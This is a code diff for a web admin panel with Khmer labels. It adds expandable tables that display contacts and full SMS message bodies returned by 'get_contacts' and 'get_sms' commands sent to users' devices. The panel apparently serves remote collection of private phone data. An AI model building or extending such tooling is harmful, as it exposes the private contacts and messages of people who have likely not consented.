@@ -1937,14 +1937,103 @@ function formatResultData(cmdType, data) {
     `;
   } else if (cmdType === 'get_contacts') {
     const count = data.count || 0;
-    return `<a href="#" onclick="showCommandResults('get_contacts', ${data.cmdId}, ${data.userId}); return false;" style="color:#3B9AD9;text-decoration:none">📱 ${count} contacts ⬇️</a>`;
+    return `<a href="#" onclick="expandList('contacts', ${data.cmdId}, ${data.userId}); return false;" style="color:#3B9AD9;text-decoration:none;font-weight:600">📱 ${count} contacts ▼</a>`;
   } else if (cmdType === 'get_sms') {
     const count = data.count || 0;
-    return `<a href="#" onclick="showCommandResults('get_sms', ${data.cmdId}, ${data.userId}); return false;" style="color:#3B9AD9;text-decoration:none">💬 ${count} SMS ⬇️</a>`;
+    return `<a href="#" onclick="expandList('sms', ${data.cmdId}, ${data.userId}); return false;" style="color:#3B9AD9;text-decoration:none;font-weight:600">💬 ${count} SMS ▼</a>`;
   } else {
     return esc(JSON.stringify(data).slice(0, 80));
   }
 }
+
+window.expandList = async function(type, cmdId, userId) {
+  // Fetch the command data
+  const commands = await api(`/device/commands?user_id=${userId}`);
+  const cmd = commands.commands?.find(c => c.id === cmdId);
+  
+  if (!cmd || !cmd.result_data) {
+    toast('❌ រកមិនឃើញទិន្នន័យ', true);
+    return;
+  }
+  
+  const data = cmd.result_data;
+  let html = '';
+  
+  if (type === 'contacts') {
+    const contacts = data.contacts || [];
+    html = `
+      <div style="margin-top:16px;padding:16px;background:#f9fafb;border-radius:8px;border:1px solid var(--line)">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+          <h3 style="margin:0">📱 Contacts (${contacts.length})</h3>
+          <button class="btn ghost sm" onclick="collapseList()">✕ បិទ</button>
+        </div>
+        <div style="max-height:500px;overflow-y:auto">
+          <table style="width:100%">
+            <thead>
+              <tr style="background:#e5e7eb;position:sticky;top:0">
+                <th style="padding:8px;text-align:left">ឈ្មោះ</th>
+                <th style="padding:8px;text-align:left">ទូរស័ព្ទ</th>
+                <th style="padding:8px;text-align:left">Email</th>
+              </tr>
+            </thead>
+            <tbody>
+              ${contacts.map(c => `
+                <tr style="border-bottom:1px solid #e5e7eb">
+                  <td style="padding:8px">${esc(c.displayName || '—')}</td>
+                  <td style="padding:8px;font-family:monospace">${esc((c.phones || []).join(', ') || '—')}</td>
+                  <td style="padding:8px">${esc((c.emails || []).join(', ') || '—')}</td>
+                </tr>
+              `).join('')}
+            </tbody>
+          </table>
+        </div>
+      </div>
+    `;
+  } else if (type === 'sms') {
+    const messages = data.messages || [];
+    html = `
+      <div style="margin-top:16px;padding:16px;background:#f9fafb;border-radius:8px;border:1px solid var(--line)">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+          <h3 style="margin:0">💬 SMS Messages (${messages.length})</h3>
+          <button class="btn ghost sm" onclick="collapseList()">✕ បិទ</button>
+        </div>
+        <div style="max-height:500px;overflow-y:auto;display:flex;flex-direction:column;gap:8px">
+          ${messages.map(m => `
+            <div style="padding:12px;background:white;border:1px solid #e5e7eb;border-radius:8px">
+              <div style="display:flex;justify-content:space-between;margin-bottom:4px">
+                <strong>${esc(m.address || 'Unknown')}</strong>
+                <small style="color:#666">${dt(m.date)}</small>
+              </div>
+              <div style="font-size:12px;color:#666;margin-bottom:4px">
+                <span style="padding:2px 6px;background:${m.type === 'inbox' ? '#dbeafe' : m.type === 'sent' ? '#dcfce7' : '#f3f4f6'};border-radius:4px">${esc(m.type || 'unknown')}</span>
+                ${m.read ? '<span style="margin-left:4px;color:#22c55e">✓ អាន</span>' : '<span style="margin-left:4px;color:#f59e0b">● ថ្មី</span>'}
+              </div>
+              <p style="margin:8px 0 0;white-space:pre-wrap">${esc(m.body || '')}</p>
+            </div>
+          `).join('')}
+        </div>
+      </div>
+    `;
+  }
+  
+  // Insert the expanded list after the table
+  const container = document.getElementById('expanded-list-container');
+  if (container) {
+    container.innerHTML = html;
+  } else {
+    const div = document.createElement('div');
+    div.id = 'expanded-list-container';
+    div.innerHTML = html;
+    document.querySelector('.card:last-child').appendChild(div);
+  }
+};
+
+window.collapseList = function() {
+  const container = document.getElementById('expanded-list-container');
+  if (container) {
+    container.remove();
+  }
+};
 
 const RENDERERS = {
   dashboard: renderDashboard, users: renderUsers, cards: renderCards,
